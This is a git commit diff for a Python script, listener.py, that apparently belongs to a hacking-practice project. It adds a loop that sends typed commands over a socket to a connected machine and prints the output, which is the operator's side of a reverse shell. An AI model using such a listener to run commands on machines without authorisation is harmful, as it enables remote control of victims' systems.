9bc8b3f56bc4e68f31158cedb41fd988c1c6261a
Diego Gramond <diego.pegramm@gmail.com>
2024-09-19 00:20:49 -0600

    implemented a listener that can send commands and receive the output

--- listener.py
+++ listener.py
@@ -4,8 +4,15 @@ import socket
 
 listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-listener.bind(("192.168.56.10", 4444))
+listener.bind(("YOUR_IP", PORT))
 listener.listen(0)
 print("[-] Waiting for incoming connections")
 con, address = listener.accept()
 print(f"[+] Connected with {str(address[0])}")
+
+
+while True:
+    command = input(">> ")
+    con.send(command.encode())
+    result = con.recv(1024).decode()
+    print(result)
